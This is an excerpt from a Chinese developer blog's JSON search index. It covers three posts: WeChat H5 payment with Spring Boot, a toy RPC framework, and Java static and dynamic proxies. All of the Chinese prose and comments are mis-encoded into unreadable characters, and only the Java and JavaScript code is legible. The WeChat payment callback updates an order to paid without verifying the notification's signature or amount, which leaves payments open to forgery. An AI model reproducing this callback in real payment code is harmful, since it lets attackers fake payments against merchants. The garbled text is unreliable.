ä¸‹è½½å¾®ä¿¡å¼€å‘è€…å·¥å…· è·å–codeä¹‹åï¼Œç‚¹å‡»å¾®ä¿¡æ”¯ä»˜ï¼Œå‘é€ajaxè¯·æ±‚ç»™åå° @RequestMapping(&quot;/payH5&quot;) @ResponseBody public Object payH5(@RequestParam(&quot;orderNumber&quot;) String orderNumber, @RequestParam(&quot;type&quot;) Integer type, HttpServletRequest request, HttpServletResponse response,@RequestParam(value = &quot;code&quot;,defaultValue = &quot;&quot;)String code) throws Exception{ try{ OrderInfo info = orderInfoService.selectOne(new EntityWrapper&lt;OrderInfo&gt;() .eq(&quot;order_number&quot;, orderNumber)); ModelAndView modelAndView = new ModelAndView(); //æ”¯ä»˜å®æ”¯ä»˜ if(type.intValue()==1){ response.sendRedirect(&quot;http://m.XXXX.com/alipay.html?orderNumber=&quot;+orderNumber); //å¾®ä¿¡æ”¯ä»˜ }else if(type.intValue()==0){ if(&quot;&quot;.equals(code)){ return &quot;è¿”å›é”™è¯¯ç•Œé¢&quot;; } WxpayConfig wxpayConfig = new WxpayConfig(); //æ­¤å¤„è·å–openid,åå°å‘è¯·æ±‚ç»™ï¼Œé€šè¿‡codeï¼ŒappIdï¼Œappsecret String res = HttpUtil.sendGet(&quot;https://api.weixin.qq.com/sns/oauth2/access_token&quot;, &quot;appid=&quot;+wxpayConfig.getApp_id()+&quot;&amp;secret=&quot;+wxpayConfig.getApp_secret()+&quot;&amp;code=&quot;+code+&quot;&amp;grant_type=authorization_code&quot;); JSONObject json = JSONObject.parseObject(res); String openId = json.getString(&quot;openid&quot;); Map&lt;String,String&gt; paraMap = new HashMap&lt;&gt;(); paraMap.put(&quot;appid&quot;,wxpayConfig.getApp_id()); paraMap.put(&quot;body&quot;,info.getOrderProject()); paraMap.put(&quot;mch_id&quot;,wxpayConfig.getMch_id()); paraMap.put(&quot;nonce_str&quot;, WXPayUtil.generateNonceStr()); paraMap.put(&quot;openid&quot;,openId); String randomNum = (int)((Math.random()*9+1)*100000)+&quot;&quot;; String orderNo =randomNum+orderNumber; paraMap.put(&quot;out_trade_no&quot;,orderNo); paraMap.put(&quot;spbill_create_ip&quot;,wxpayConfig.getSpbill_create_ip()); String total_fee = info.getOrderMoney().multiply(new BigDecimal(&quot;100&quot;)).intValue()+&quot;&quot;; paraMap.put(&quot;total_fee&quot;,total_fee); paraMap.put(&quot;trade_type&quot;,wxpayConfig.getTrade_type()); paraMap.put(&quot;notify_url&quot;,&quot;http://XXXX.com/XXXX/api/wxnotify?orderNumber=&quot;+orderNumber); String apiKey = wxpayConfig.getApi_key(); String sign = WXPayUtil.generateSignature(paraMap,apiKey); paraMap.put(&quot;sign&quot;,sign); String xml = WXPayUtil.mapToXml(paraMap); //ç»Ÿä¸€ä¸‹å• https://api.mch.weixin.qq.com/pay/unifiedorder String unifiedorder_url = &quot;https://api.mch.weixin.qq.com/pay/unifiedorder&quot;; String xmlStr = HttpUtil.sendPost(unifiedorder_url,xml,false); //ä»¥ä¸‹å†…å®¹æ˜¯è¿”å›å‰ç«¯é¡µé¢çš„jsonæ•°æ® String prepay_id = &quot;&quot;;//é¢„æ”¯ä»˜id if (xmlStr.indexOf(&quot;SUCCESS&quot;) != -1) { Map&lt;String, String&gt; map = WXPayUtil.xmlToMap(xmlStr); prepay_id = (String) map.get(&quot;prepay_id&quot;); } Map&lt;String, String&gt; payMap = new HashMap&lt;String, String&gt;(); payMap.put(&quot;appId&quot;, wxpayConfig.getApp_id()); payMap.put(&quot;timeStamp&quot;, WXPayUtil.getCurrentTimestamp()+&quot;&quot;); payMap.put(&quot;nonceStr&quot;, WXPayUtil.generateNonceStr()); payMap.put(&quot;signType&quot;, &quot;MD5&quot;); payMap.put(&quot;package&quot;, &quot;prepay_id=&quot; + prepay_id); String paySign = WXPayUtil.generateSignature(payMap, wxpayConfig.getApi_key()); payMap.put(&quot;paySign&quot;, paySign); return payMap; } return &quot;&quot;; }catch (Exception e){ e.printStackTrace(); } return &quot;end&quot;; // return new SuccessResponseData(); }è·å–sign è·å–sign ä¸‹è½½åï¼Œé‡Œé¢æœ‰ä¸€äº›å·¥å…·ç±»ï¼ŒWXPayUtilé‡Œé¢æœ‰ä¸€ä¸ªæ–¹æ³•å¯ä»¥è·å– è¿”å›æ•°æ®åˆ°å‰å°åï¼Œå‰å°è°ƒç”¨jså¯¹è±¡ï¼Œæ‰§è¡Œ WeixinJSBridge.invoke( &apos;getBrandWCPayRequest&apos;, { &quot;appId&quot;:appId, //å…¬ä¼—å·åç§°,ç”±å•†æˆ·ä¼ å…¥ &quot;timeStamp&quot;:timeStamp, //æ—¶é—´æˆ³,è‡ª1970å¹´ä»¥æ¥çš„ç§’æ•° &quot;nonceStr&quot;:nonceStr, //éšæœºä¸² &quot;package&quot;:package, &quot;signType&quot;:signType, //å¾®ä¿¡ç­¾åæ–¹å¼ï¼š &quot;paySign&quot;:paySign //å¾®ä¿¡ç­¾å }, function(res){ console.log(res); window.location.href = &quot;http://m.XXXX.com/orderDetail.html?orderNum=&quot;+orderNumber; // if(res.err_msg == &quot;get_brand_wcpay_request:ok&quot; ) { // console.log(&apos;æ”¯ä»˜æˆåŠŸ&apos;); // //æ”¯ä»˜æˆåŠŸåè·³è½¬çš„é¡µé¢ // }else if(res.err_msg == &quot;get_brand_wcpay_request:cancel&quot;){ // console.log(&apos;æ”¯ä»˜å–æ¶ˆ&apos;); // }else if(res.err_msg == &quot;get_brand_wcpay_request:fail&quot;){ // console.log(&apos;æ”¯ä»˜å¤±è´¥&apos;); // } //ä½¿ç”¨ä»¥ä¸Šæ–¹å¼åˆ¤æ–­å‰ç«¯è¿”å›,å¾®ä¿¡å›¢é˜Ÿéƒ‘é‡æç¤ºï¼šres.err_msgå°†åœ¨ç”¨æˆ·æ”¯ä»˜æˆåŠŸåè¿”å›ok,ä½†å¹¶ä¸ä¿è¯å®ƒç»å¯¹å¯é ã€‚ }å°±ä¼šæ‰§è¡Œå¾®ä¿¡æ”¯ä»˜ï¼Œä¸ç®¡æˆåŠŸæ²¡æœ‰ï¼Œéƒ½ä¼šè·³è½¬åˆ°orderDetailç•Œé¢ï¼ŒæŸ¥çœ‹orderè¯¦æƒ… å¾®ä¿¡å›è°ƒ å¾®ä¿¡ä¼šè¿”å›ç»“æœ æˆ‘åº”è¯¥å¤„ç†ä»€ä¹ˆ å‘Šè¯‰å¾®ä¿¡ï¼Œæˆ‘æ”¶åˆ°äº†ï¼Œè¿”å›success å¯¹è®¢å•ä¿¡æ¯ï¼Œè·å–orderNumï¼Œå¯¹è®¢å•çŠ¶æ€è¿›è¡Œæ›´æ–° @RequestMapping(&quot;/wxnotify&quot;) public String wxnotify(HttpServletRequest request,HttpServletResponse response){ InputStream is = null; try{ is = request.getInputStream(); String xml = WXPayUtil.inputStream2String(is); Map&lt;String,String&gt; notifyMap = WXPayUtil.xmlToMap(xml); if(notifyMap.get(&quot;return_code&quot;).equals(&quot;SUCCESS&quot;)) { String orderNumber = notifyMap.get(&quot;out_trade_no&quot;).substring(6); OrderInfo info = orderInfoService.selectOne(new EntityWrapper&lt;OrderInfo&gt;() .eq(&quot;order_number&quot;, orderNumber)); info.setOrderState(1); orderInfoService.updateById(info); String amount = notifyMap.get(&quot;total_fee&quot;); System.out.println(&quot;å®é™…ä»˜æ¬¾ï¼š&quot;+amount); } response.getWriter().write(&quot;&lt;xml&gt;&lt;return_code&gt;&lt;![CDATA[SUCCESS]]&gt;&lt;/return_code&gt;&lt;/xml&gt;&quot;); is.close(); } catch (Exception e) { e.printStackTrace(); } return null; }","categories":[],"tags":[{"name":"æ”¯ä»˜","slug":"æ”¯ä»˜","permalink":"http://yoursite.com/tags/%E6%94%AF%E4%BB%98/"},{"name":"å¾®ä¿¡H5æ”¯ä»˜","slug":"å¾®ä¿¡H5æ”¯ä»˜","permalink":"http://yoursite.com/tags/%E5%BE%AE%E4%BF%A1H5%E6%94%AF%E4%BB%98/"},{"name":"jsapi springboot","slug":"jsapi-springboot","permalink":"http://yoursite.com/tags/jsapi-springboot/"}]},{"title":"è¯»æ¢é£-RPCæ¡†æ¶å‡ è¡Œä»£ç å°±å¤Ÿäº†   æœ‰æ„Ÿ","slug":"è¯»æ¢é£-RPCæ¡†æ¶å‡ è¡Œä»£ç å°±å¤Ÿäº†   æœ‰æ„Ÿ","date":"2018-12-30T13:59:59.000Z","updated":"2020-11-14T17:11:08.901Z","comments":true,"path":"2018/12/30/è¯»æ¢é£-RPCæ¡†æ¶å‡ è¡Œä»£ç å°±å¤Ÿäº†   æœ‰æ„Ÿ/","link":"","permalink":"http://yoursite.com/2018/12/30/%E8%AF%BB%E6%A2%81%E9%A3%9E-RPC%E6%A1%86%E6%9E%B6%E5%87%A0%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%B0%B1%E5%A4%9F%E4%BA%86%20%20%20%E6%9C%89%E6%84%9F/","excerpt":"","text":"æ¢é£-dubboæ¡†æ¶çš„è®¾è®¡è€…ï¼Œæ˜¯ä¸€ä½é˜¿é‡Œçš„èµ„æ·±æ¶æ„å¸ˆ RPCæ¡†æ¶å‡ è¡Œä»£ç å°±å¤Ÿäº†ï¼Œè¿™ç¯‡æ–‡ç« ååˆ†é€‚åˆä¸æ˜¯å¾ˆäº†è§£RPCçš„äººçœ‹ä¸€éï¼Œæœ€å¥½æ˜¯è‡ªå·±æ•²ä¸€éã€‚æ³¨é‡Šï¼Œå¯¹å…¥å‚çš„å¤„ç†ï¼Œå¯¹æµç”¨åè¿›è¡Œå…³é—­ï¼ŒåŠ¨æ€ä»£ç†çš„ä½¿ç”¨ã€‚è¿™è¾¹æ–‡ç« åœ°å€ï¼š https://javatar.iteye.com/blog/1123915 é¦–å…ˆå°†ä¸€ä¸‹ï¼Œä¸ºä»€ä¹ˆç”¨RPC( Remote Procedure Call )è¿œç¨‹å·¥ç¨‹è°ƒç”¨ã€‚ä»€ä¹ˆæƒ…å†µä¸‹ä¼šç”¨åˆ°ï¼Œä¸€ä¸ªå…¬å¸çš„é¡¹ç›®å¯èƒ½å¤§å¯èƒ½å°ï¼Œå°çš„é¡¹ç›®ï¼Œå¯èƒ½ä¸€ä¸ªé¡¹ç›®ï¼Œè€Œæœ‰äº›é¡¹ç›®ï¼Œå¯èƒ½å…‰ä»£ç å’Œjarå°±èƒ½æœ‰1Gå¤§å°ï¼Œè¿™æ—¶å€™å°±ä¼šè®¾è®¡åˆ°åˆ†å¸ƒå¼ï¼Œä¼šå°†åŸæœ¬çš„é¡¹ç›®è¿›è¡Œæ‹†åˆ†ï¼Œæ‹†åˆ†æˆå¤šä¸ªå°é¡¹ç›®ï¼Œè®©ä¸åŒçš„å›¢é˜Ÿå»è´Ÿè´£ä¸åŒçš„æ¨¡å—ã€‚é¡¹ç›®ä¸­å¦‚æœç”¨åˆ°åˆ«çš„é¡¹ç›®çš„æ¥å£ï¼Œè¿™ä¸ªæ—¶å€™å°±ç”¨åˆ°äº†RPCã€‚å½“ç„¶ï¼Œè¿™æ˜¯æ‹†åˆ†é¡¹ç›®ï¼Œä¹Ÿå¯ä»¥åœ¨åˆ›å»ºé¡¹ç›®çš„æ—¶å€™ï¼Œå°±æ˜¯åˆ†å¸ƒå¼çš„ã€‚ *é‚£ä¹ˆæˆ‘ä»¬å°±å…·ä½“è°ˆè°ˆ è¿™ç¯‡åšæ–‡ä¸­çš„å¦‚ä½•å®ç°çš„RPC * ï¼š é¦–å…ˆæœ‰ä¸¤ä¸ªé¡¹ç›®ï¼ˆä¸¾ä¾‹ï¼‰ï¼Œåˆ†åˆ«ä¸ºï¼šç”Ÿäº§è€…ï¼Œæ¶ˆè´¹è€…ã€‚ç”Ÿäº§è€…ï¼šä¸€ç›´å¯åŠ¨æœåŠ¡ï¼Œä¸ºæ¶ˆè´¹è€…æä¾›æœåŠ¡ï¼Œå¹¶æš´éœ²æœåŠ¡æ¶ˆè´¹è€…ï¼šå¯åŠ¨åº”ç”¨ï¼Œé€šè¿‡hostï¼Œportï¼Œservice.classä¸‰ä¸ªå‚æ•°å»ç¡®å®šå…·ä½“è°ƒç”¨çš„æ˜¯é‚£ä¸ªæ¥å£hostï¼Œportæ˜¯ä¸ºäº†é”å®šç”Ÿäº§è€…æ˜¯å“ªå°æœºå™¨é‚£ä¸ªç«¯å£ï¼Œservcice.classä¸ºäº†é”å®šè°ƒç”¨æ¥å£çš„classã€‚ æ¶ˆè´¹è€…å’Œç”Ÿäº§è€…ä¹‹é—´æ˜¯ä½¿ç”¨javaä¸­è‡ªå¸¦çš„socketè¿›è¡Œé€šä¿¡çš„ã€‚æ¶ˆè´¹è€…ï¼š HelloService service = RpcFramework.refer(HelloService.class, &quot;127.0.0.1&quot;, 1234); è¿™é‡Œé¢å…·ä½“ç”¨åˆ°äº†æ˜¯æˆ‘ä¸Šä¸€ç¯‡åšå®¢ä¸­æåˆ°çš„åŠ¨æ€ä»£ç†æŠ€æœ¯ï¼Œåœ¨è¿è¡Œä¸­åŠ¨æ€ç”Ÿæˆçš„ï¼Œè€Œè¿™è¾¹è¿™ä¸ªåŠ¨æ€ä»£ç†é‡Œé¢ï¼Œä¼šç”¨åˆ°socketè¿›è¡Œè¿œç¨‹é€šä¿¡ï¼Œå°†è°ƒç”¨çš„æ¥å£ï¼Œæ–¹æ³•ï¼Œå‚æ•°ï¼Œé€šè¿‡socketå†™è¿‡å»ï¼Œç„¶åç”¨ä¸€ä¸ªObjectInputStreamï¼ˆé˜»å¡å¼çš„ï¼‰æ¥æ¥æ”¶ä»ç”Ÿäº§è€…è¿”å›çš„æ•°æ® ç”Ÿäº§è€…ï¼šå…ˆæä¾›ä¸€ä¸ªsocketServerå¹¶ç¡®å®šç«¯å£ï¼Œå¯ä»¥æ¥æ”¶socketä¼ è¿‡æ¥çš„æ•°æ®ã€‚è¿™æ˜¯ä¸€ä¸ªwhiletrueçš„æ–¹å¼ã€‚å› ä¸ºæ˜¯å¯ä»¥ä¸æ–­å¾ªç¯ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰äººè¿æ¥çš„è¿™ä¸ªsocketServeræœåŠ¡å™¨ï¼Œå¦‚æœæ¥æ”¶çš„æ•°æ®ï¼Œå°±å¼€ä¸€ä¸ªçº¿ç¨‹æ¥æ¥æ”¶æ•°æ®ï¼Œå¹¶è¿”å›æ•°æ®ã€‚è¿™é‡Œé¢ä¸æ˜¯çœŸæ­£çš„è°ƒç”¨ï¼Œè€Œæ˜¯é€šè¿‡åå°„çš„æ–¹å¼ï¼Œç›´æ¥method.invoke()çš„æ–¹å¼è·å¾—è¿™ä¸ªæ–¹æ³•çš„è¿”å›å€¼ï¼Œå¹¶å°†è¿”å›å€¼é€šè¿‡socketå†™å›å»ï¼Œè¿”å›ç»™æ¶ˆè´¹è€…ã€‚ã€‚è¿™è¾¹çš„å¼€çº¿ç¨‹çš„å¥½å¤„ï¼Œæ›´å¤šçš„æ˜¯è®©ç¨‹åºå¯ä»¥å¹¶è¡Œçš„å¤„ç†æ•°æ®ï¼Œè€Œä¸æ˜¯å¤„ç†äº†ä¸€ä¸ªæ–¹æ³•ï¼Œåœ¨å¤„ç†ä¸­ï¼Œç¬¬äºŒä¸ªæ–¹æ³•æ¥äº†ï¼Œè€Œæ— æ³•å¯¹å…¶è¿›è¡ŒæœåŠ¡ï¼Œå¢åŠ æœåŠ¡èƒ½åŠ›ã€‚ å½“ç„¶ï¼Œè¿™ç¯‡åšæ–‡é‡Œé¢æ›´å¤šçš„æ˜¯ä¸€ç§ç¤ºèŒƒï¼Œè¿™è¾¹è¿æ¥çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨nettyï¼Œå½“ç„¶åªæ˜¯é“å¬é€”è¯´ åˆšåˆšå»çœ‹äº†dubboåœ¨githubé‡Œé¢çš„issueï¼Œ https://github.com/apache/incubator-dubbo/issues/3088 æˆ‘å¯¹é‡Œé¢çš„é—®é¢˜è¿›è¡Œäº†æˆªå›¾ éƒ½æ˜¯å›½äººå§ï¼Œä½†æ˜¯ä¸€èˆ¬éƒ½ä¼šä½¿ç”¨è‹±æ–‡äº¤æµï¼Œè¿™å°±æ˜¯ä¸€ç§æ°›å›´å§ï¼Œè€Œä¸”ä¸€ä¸ªå…¬å¸æ•¢äºå°†è‡ªå·±çš„äº§å“å¼€æºå‡ºå»ï¼Œå°±æ˜¯ä¸€ç§æ€åº¦ã€‚æˆ‘è¿˜è®°å¾—è¿™é‡Œé¢å°±æœ‰ä¸€äº›åŒæ ·æ˜¯äº’è”ç½‘å…¬å¸","categories":[],"tags":[{"name":"rpc","slug":"rpc","permalink":"http://yoursite.com/tags/rpc/"}]},{"title":"é¢è¯•ä¹‹ä»£ç†","slug":"é¢è¯•ä¹‹ä»£ç†","date":"2018-12-23T09:53:51.000Z","updated":"2020-11-14T17:11:09.792Z","comments":true,"path":"2018/12/23/é¢è¯•ä¹‹ä»£ç†/","link":"","permalink":"http://yoursite.com/2018/12/23/%E9%9D%A2%E8%AF%95%E4%B9%8B%E4%BB%A3%E7%90%86/","excerpt":"","text":"æ˜¨å¤©é¢è¯•ç¢°åˆ°äº†é¢è¯•å®˜é—®springçš„æ—¶å€™ï¼Œé—®å®Œiocï¼Œç„¶åä¸‹ä¸ªé—®é¢˜æˆ‘ä»¥ä¸ºæ˜¯aopï¼Œåæ¥æ‰å¬æ¸…æ˜¯åŠ¨æ€ä»£ç†ï¼Œæ„Ÿè§‰å›ç­”çš„ä¸æ˜¯å¤ªå¥½ï¼Œä¹Ÿæ˜¯å¥½ä¹…ä¸æ¥è§¦ 1.é™æ€ä»£ç†ä»£ç†æ¨¡å¼ä¹Ÿå°±å§”æ‰˜æ¨¡å¼ã€‚ä¸‰ä¸ªè§’è‰²ï¼š SubjectæŠ½è±¡ä¸»é¢˜è§’è‰²ï¼šæ¥å£ RealSubjectå…·ä½“ä¸»é¢˜è§’è‰²ï¼šæ¥å£çš„å®ç°ç±»ï¼Œä¸šåŠ¡é€»è¾‘çš„å…·ä½“æ‰§è¡Œè€… Proxyä»£ç†ä¸»é¢˜è§’è‰²ï¼šä¹Ÿå«åšå§”æ‰˜ç±»ï¼Œä»£ç†ç±»ã€‚å®ƒè´Ÿè´£å¯¹çœŸå®è§’è‰²çš„åº”ç”¨ï¼Œè´Ÿè´£çœŸå®è§’è‰²å‰åå‰ååšé¢„å¤„ç†å’Œå–„åå¤„ç†ã€‚ åœ¨è¿™é‡Œé¢Subjectæ˜¯ä¸€ä¸ªå€Ÿå£ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªRequestï¼ˆï¼‰æ–¹æ³•ï¼ŒRealSubjectç±»å®ç°äº†Subjectè¿™ä¸ªæ¥å£ï¼Œå¹¶ä¸”å®ç°äº†requestï¼ˆï¼‰æ–¹æ³•ï¼Œè€Œåœ¨Proxyä¹Ÿå®ç°äº†Subjectæ¥å£ï¼Œproxyé‡Œé¢è¿˜æœ‰ä¸€ä¸ªå˜é‡Subjectï¼Œå¯ä»¥é€šè¿‡æ„é€ å‡½æ•°å°†RealSubjectæ³¨å…¥ï¼Œåœ¨å®ç°requestæ–¹æ³•æ—¶ï¼Œå…¶å®æ˜¯è°ƒç”¨çš„æ˜¯Realsubjecté‡Œé¢çš„requestæ–¹æ³•ï¼Œåœ¨è°ƒç”¨requestï¼ˆï¼‰æ–¹æ³•å‰åå¯ä»¥è°ƒç”¨ä¸€äº›å…¶ä»–çš„æ–¹æ³•ã€‚ä¸‹é¢æ˜¯å…·ä½“çš„ä»£ç  Subject.java public interface Subject { //å®šä¹‰ä¸€ä¸ªæ–¹æ³• public void request(); }RealSubject.java public class RealSubject implements Subject { @Override public void request() { //ä¸šåŠ¡é€»è¾‘å¤„ç† } }Proxy.java public class Proxy implements Subject { private Subject subject = null; public Proxy(Subject subject){ this.subject = subject; } @Override public void request() { before(); subject.request(); after(); } public void before(){ //do something } public void after(){ //do something } }ä»£ç†æ¨¡å¼çš„ä½¿ç”¨åœºæ™¯ä¸ºä»€ä¹ˆè¦ä½¿ç”¨ä»£ç†å‘¢ï¼Ÿæƒ³æƒ³ç°å®ä¸–ç•Œå§ï¼Œæ‰“å®˜å¸ä¸ºä»€ä¹ˆè¦æ‰¾ä¸ªå¾‹å¸ˆï¼Ÿå› ä¸ºä½ ä¸æƒ³å‚ä¸ä¸­é—´è¿‡ç¨‹çš„æ˜¯æ˜¯ééï¼Œåªè¦å®Œæˆè‡ªå·±çš„ç­”è¾©å°±è¡Œäº†ï¼Œå…¶ä»–çš„æ¯”å¦‚äº‹å‰è°ƒæŸ¥ã€äº‹åè°ƒæŸ¥éƒ½ç”±å¾‹å¸ˆæå®šï¼Œè¿™å°±æ˜¯ä¸ºäº†å‡è½»ä½ çš„è´Ÿæ‹…ã€‚ä»£ç†æ¨¡å¼çš„ä½¿ç”¨åœºæ™¯éå¸¸å¤šï¼Œå¯ä»¥çœ‹è§Springaopï¼Œè¿™æ˜¯éå¸¸å…¸å‹çš„åŠ¨æ€ä»£ç† äºŒï¼šåŠ¨æ€ä»£ç†åŠ¨æ€ä»£ç†æ˜¯åœ¨å®ç°é˜¶æ®µä¸ç”¨å…³å¿ƒä»£ç†è°ï¼Œè€Œåœ¨è¿è¡Œé˜¶æ®µæ‰æŒ‡å®šä»£ç†å“ªä¸€ä¸ªå¯¹è±¡ã€‚ç›¸å¯¹æ¥è¯´ï¼Œè‡ªå·±å†™ä»£ç†ç±»çš„æ–¹å¼å°±å«é™æ€ä»£ç†åˆ’é‡ç‚¹ï¼Œåœ¨è¿è¡Œé˜¶æ®µæŒ‡å®šå“ªä¸€ä¸ªå¯¹è±¡å…·ä½“ä»£ç ï¼Œé€»è¾‘å¾…ä¼šå†è¯´ æŠ½è±¡ä¸»é¢˜ public interface Subject { /** * //ä¸šåŠ¡æ“ä½œ * @param str */ void doSomething(String str); /** * åƒ * */ void eat(String str); }çœŸå®ä¸»é¢˜ public class RealSubject implements Subject { @Override public void doSomething(String str) { System.out.println(&quot;do something!----&gt;&quot; + str); } @Override public void eat(String str) { System.out.println(&quot;ä»Šå¤©æ™šä¸Šåƒ&quot;+str); } }åŠ¨æ€ä»£ç†çš„handlerç±» public class MyInvocationHandler implements InvocationHandler { /** * è¢«ä»£ç†çš„å¯¹è±¡ */ private Object target; public MyInvocationHandler(Object target){ this.target = target; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { //log Before System.out.println(&quot;log before:&quot;+&quot;method: &quot;+method.getName()+ &quot;return :&quot;+method.getReturnType().getSimpleName()); Object result = method.invoke(target,args); System.out.println(&quot;log after: &quot;+new Date(System.currentTimeMillis())); return result; } }åŠ¨æ€ä»£ç†ç±» public class DynamicProxy&lt;T&gt; { public static &lt;T&gt; T newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler handler){ //è¿”å›ç›®æ ‡ï¼Œå¹¶è¿”å›ç»“æœ return (T) Proxy.newProxyInstance(loader,interfaces,handler); } }åŠ¨æ€ä»£ç†çš„åœºæ™¯ç±» public class Client { public static void main(String[] args) throws IOException { //å®šä¹‰ä¸€ä¸ªä»£ç†ç±» Subject subject = new RealSubject(); //å®šä¹‰ä¸€ä¸ªHandler InvocationHandler handler = new MyInvocationHandler(subject); //å®šä¹‰ä¸»é¢˜çš„ä»£ç† Subject proxy = DynamicProxy.newProxyInstance(subject.getClass().getClassLoader(),subject.getClass().getInterfaces(),handler); //ä»£ç†çš„è¡Œä¸º System.out.println(proxy.getClass().getCanonicalName()); proxy.doSomething(&quot;finish&quot;); proxy.eat(&quot;é¦™é”…é‡Œè¾£å®¶çš„éº»è¾£é¦™é”…&quot;); //æ­¤å¤„å¯ä»¥å°† byte[] proxyClass = ProxyGenerator.generateProxyClass(proxy.getClass() .getSimpleName(), proxy.getClass().getInterfaces()); //å°†å­—èŠ‚ç æ–‡ä»¶ä¿å­˜åˆ°Dç›˜ï¼Œæ–‡ä»¶åä¸º$Proxy0.class FileOutputStream outputStream = new FileOutputStream(new File( &quot;d:\\\\$Proxy0.class&quot;)); outputStream.write(proxyClass); outputStream.flush(); outputStream.close(); } }åˆ†æè¿‡ç¨‹ï¼š Subject proxy = DynamicProxy.newProxyInstance(subject.getClass().getClassLoader(),subject.getClass().getInterfaces(),handler);_åœ¨æˆ‘ä»¬ä½¿ç”¨proxy.doSomthing(args);proxy.eat(args); __æˆ‘ä»¬å¯ä»¥æƒ³è±¡å‡ºï¼ŒDynamicProxy.newProxyInstanceï¼ˆargsï¼‰è¿™ä¸ªæ–¹æ³•è¿”å›äº†ä¸€ä¸ªproxyå¯¹è±¡ _æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯è°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•*newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h) * @CallerSensitive public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) throws IllegalArgumentException { Objects.requireNonNull(h); final Class&lt;?&gt;[] intfs = interfaces.clone(); final SecurityManager sm = System.getSecurityManager(); if (sm != null) { checkProxyAccess(Reflection.getCallerClass(), loader, intfs); } /* * Look up or generate the designated proxy class. */ // æ­¤å¤„å°±è®²classç”Ÿæˆå¥½äº† Class&lt;?&gt; cl = getProxyClass0(loader, intfs); /* * Invoke its constructor with the designated invocation handler. */ try { if (sm != null) { checkNewProxyPermission(Reflection.getCallerClass(), cl); } final Constructor&lt;?&gt; cons = cl.getConstructor(constructorParams); final InvocationHandler ih = h; if (!Modifier.isPublic(cl.getModifiers())) { AccessController.doPrivileged(new PrivilegedAction&lt;Void&gt;() { public Void run() { cons.setAccessible(true); return null; } }); } // é€šè¿‡æ„é€ å‚æ•°é‡æ–°åˆ›å»ºå®ä¾‹ return cons.newInstance(new Object[]{h}); } catch (IllegalAccessException|InstantiationException e) { throw new InternalError(e.toString(), e); } catch (InvocationTargetException e) { Throwable t = e.getCause(); if (t instanceof RuntimeException) { throw (RuntimeException) t; } else { throw new InternalError(t.toString(), t); } } catch (NoSuchMethodException e) { throw new InternalError(e.toString(), e); } }æœ€åè¿™ä¸ªæ–¹æ³•ä¼šåœ¨è¿è¡Œä¸­ç”Ÿæˆä¸€ä¸ªç±»ï¼Œåå­—å«ï¼šcom.sun.proxy.$Proxy0è€Œæˆ‘ä»¬å¹¶æ²¡æœ‰æ‰¾åˆ°è¿™ä¸ªç±»ï¼Œå¯ä»¥é€šè¿‡æˆ‘ä»¬ä¸Šé¢çš„Clienté‡Œé¢çš„å°†è¿™ä¸ªè¿è¡Œä¸­ç”Ÿæˆçš„ç±»æ‰“å°å‡ºæ¥ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ï¼Œè¿™ä¸ªç±»æ˜¯ä»€ä¹ˆæ ·å­çš„$Proxy0.class,åç¼–è¯‘ public final class $Proxy0 extends Proxy implements Subject { private static Method m1; private static Method m2; private static Method m3; private static Method m4; private static Method m0; public $Proxy0(InvocationHandler var1) throws { super(var1); } public final boolean equals(Object var1) throws { try { return (Boolean)super.h.invoke(this, m1, new Object[]{var1}); } catch (RuntimeException | Error var3) { throw var3; } catch (Throwable var4) { throw new UndeclaredThrowableException(var4); } } public final String toString() throws { try { return (String)super.h.invoke(this, m2, (Object[])null); } catch (RuntimeException | Error var2) { throw var2; } catch (Throwable var3) { throw new UndeclaredThrowableException(var3); } } public final void doSomething(String var1) throws { try { super.h.invoke(this, m3, new Object[]{var1}); } catch (RuntimeException | Error var3) { throw var3; } catch (Throwable var4) { throw new UndeclaredThrowableException(var4); } } public final void eat(String var1) throws { try { super.h.invoke(this, m4, new Object[]{var1}); } catch (RuntimeException | Error var3) { throw var3; } catch (Throwable var4) { throw new UndeclaredThrowableException(var4); } } public final int hashCode() throws { try { return (Integer)super.h.invoke(this, m0, (Object[])null); } catch (RuntimeException | Error var2) { throw var2; } catch (Throwable var3) { throw new UndeclaredThrowableException(var3); } } static { try { m1 = Class.forName(&quot;java.lang.Object&quot;).getMethod(&quot;equals&quot;, Class.forName(&quot;java.lang.Object&quot;)); m2 = Class.forName(&quot;java.lang.Object&quot;).getMethod(&quot;toString&quot;); m3 = Class.forName(&quot;com.husky.dynamicproxy.Subject&quot;).getMethod(&quot;doSomething&quot;, Class.forName(&quot;java.lang.String&quot;)); m4 = Class.forName(&quot;com.husky.dynamicproxy.Subject&quot;).getMethod(&quot;eat&quot;, Class.forName(&quot;java.lang.String&quot;)); m0 = Class.forName(&quot;java.lang.Object&quot;).getMethod(&quot;hashCode&quot;); } catch (NoSuchMethodException var2) { throw new NoSuchMethodError(var2.getMessage()); } catch (ClassNotFoundException var3) { throw new NoClassDefFoundError(var3.getMessage()); } } }é¦–å…ˆ$Proxy0è¿™ä¸ªç±»extends Proxy implements Subjectæœ‰ä¸€ä¸ªé™æ€ä»£ç å—ï¼Œä¼šåå°„ç”ŸæˆMethodç±»ï¼Œä¹Ÿå°±æ˜¯ç»™ $Proxyè¿™ä¸ªç±»çš„å˜é‡èµ‹å€¼ä¸¾ä¾‹æˆ‘åœ¨è°ƒç”¨proxy.doSomething()è¿™ä¸ªæ–¹æ³•æ—¶æˆ‘ä»¬å…¶å®æ˜¯è°ƒç”¨ public final void doSomething(String var1) throws { try { super.h.invoke(this, m3, new Object[]{var1}); } catch (RuntimeException | Error var3) { throw var3; } catch (Throwable var4) { throw new UndeclaredThrowableException(var4); } }è°ƒç”¨çš„æ˜¯super.h.invoke(this, m3, new Object[]{var1});è¿™ä¸ªhä¹Ÿå°±æ˜¯å®ç°InvocationHandleræ¥å£çš„MyInvocationHandlerç±»ã€‚å°†è¿™ä¸ª$Proxy0ï¼Œm3ï¼Œ newObject[]{var1}è¿™äº›å˜é‡ä¼ è¿‡å» 